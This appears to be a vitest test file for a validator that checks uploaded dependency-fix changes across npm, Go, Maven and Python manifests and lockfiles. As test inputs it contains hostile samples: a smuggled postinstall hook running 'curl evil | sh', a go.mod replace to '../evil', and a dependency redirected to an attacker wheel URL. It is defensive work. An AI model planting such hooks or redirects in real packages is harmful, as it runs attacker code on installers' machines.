import { describe, expect, it } from 'vitest';
import { FIX_FAMILIES, FIX_FILES } from '../families';
import { checkFixUpload, type FixUploadCheck } from './upload';
import type { FixFileChange } from './types';

const NPM = 'https://registry.npmjs.org';

const packageJson = (range: string, extra = '') =>
  `{\n  "name": "app",\n  "dependencies": {\n    "qf-a": "${range}"\n  }${extra}\n}\n`;

const packageLock = (version: string) =>
  JSON.stringify({
    name: 'app',
    lockfileVersion: 3,
    packages: {
      '': { name: 'app', dependencies: { 'qf-a': '^1.2.5' } },
      'node_modules/qf-a': {
        version,
        resolved: `${NPM}/qf-a/-/qf-a-${version}.tgz`,
        integrity: `sha512-${version}`,
      },
    },
  });

const js = (files: FixFileChange[]): FixUploadCheck => ({
  family: 'js',
  packageName: 'qf-a',
  targets: [{ installed: '1.2.5', target: '1.2.6', lockfile: 'package-lock.json' }],
  files,
});

const GOOD_MANIFEST = {
  path: 'package.json',
  base: packageJson('^1.2.5'),
  next: packageJson('^1.2.6'),
};
const GOOD_LOCK = {
  path: 'package-lock.json',
  base: packageLock('1.2.5'),
  next: packageLock('1.2.6'),
};

describe('checkFixUpload', () => {
  it('accepts an upload whose every file passes', () => {
    expect(checkFixUpload(js([GOOD_MANIFEST, GOOD_LOCK]))).toEqual({ ok: true });
  });

  it('names the rule and path of the first failing file, in file order', () => {
    const smuggled = {
      path: 'apps/web/package.json',
      base: packageJson('^1.2.5'),
      next: packageJson('^1.2.6', ',\n  "scripts": { "postinstall": "curl evil | sh" }'),
    };
    expect(checkFixUpload(js([GOOD_MANIFEST, smuggled]))).toEqual({
      ok: false,
      rule: 'other_change',
      path: 'apps/web/package.json',
    });
    const stale = { ...GOOD_LOCK, next: packageLock('1.2.5') };
    expect(checkFixUpload(js([stale, smuggled]))).toEqual({
      ok: false,
      rule: 'below_target',
      path: 'package-lock.json',
    });
  });

  it.each(['README.md', 'go.mod', 'pom.xml', '.github/workflows/x.yml', 'package.json.bak'])(
    'refuses the basename of %s, which is no file of the family, as other_change',
    (path) => {
      expect(checkFixUpload(js([GOOD_MANIFEST, { path, base: 'a', next: 'b' }]))).toEqual({
        ok: false,
        rule: 'other_change',
        path,
      });
    },
  );

  it('dispatches each family by basename', () => {
    const go: FixUploadCheck = {
      family: 'go',
      packageName: 'example.com/qf',
      targets: [{ installed: 'v1.2.5', target: 'v1.2.6', lockfile: 'go.mod' }],
      files: [
        {
          path: 'go.mod',
          base: 'module a\n\nrequire example.com/qf v1.2.5\n',
          next: 'module a\n\nrequire example.com/qf v1.2.6\n\nreplace example.com/qf => ../evil\n',
        },
      ],
    };
    expect(checkFixUpload(go)).toEqual({ ok: false, rule: 'go_directive', path: 'go.mod' });
    const maven: FixUploadCheck = {
      family: 'maven',
      packageName: 'g:a',
      targets: [],
      files: [{ path: 'm/pom.xml', base: '<project/>', next: '<project><build/></project>' }],
    };
    expect(checkFixUpload(maven)).toEqual({ ok: false, rule: 'other_change', path: 'm/pom.xml' });
    const python: FixUploadCheck = {
      family: 'python',
      packageName: 'qf-a',
      targets: [],
      files: [
        {
          path: 'pyproject.toml',
          base: '[project]\ndependencies = ["qf-a>=1.2.5"]\n',
          next: '[project]\ndependencies = ["qf-a @ https://evil.example/a.whl"]\n',
        },
      ],
    };
    expect(checkFixUpload(python)).toEqual({
      ok: false,
      rule: 'bad_spec',
      path: 'pyproject.toml',
    });
  });

  it('has a check for every file the families allow (§6.7)', () => {
    for (const family of FIX_FAMILIES) {
      for (const name of [...FIX_FILES[family].manifests, ...FIX_FILES[family].lockfiles]) {
        const result = checkFixUpload({
          family,
          packageName: 'p',
          targets: [],
          files: [{ path: `dir/${name}`, base: '\u0000', next: '\u0001' }],
        });
        // Each file is read in its format; none is refused for its name.
        expect(result, `${family} ${name}`).toEqual({
          ok: false,
          rule: 'unparsable',
          path: `dir/${name}`,
        });
      }
    }
  });

  it('accepts an upload without files', () => {
    expect(checkFixUpload(js([]))).toEqual({ ok: true });
  });
});
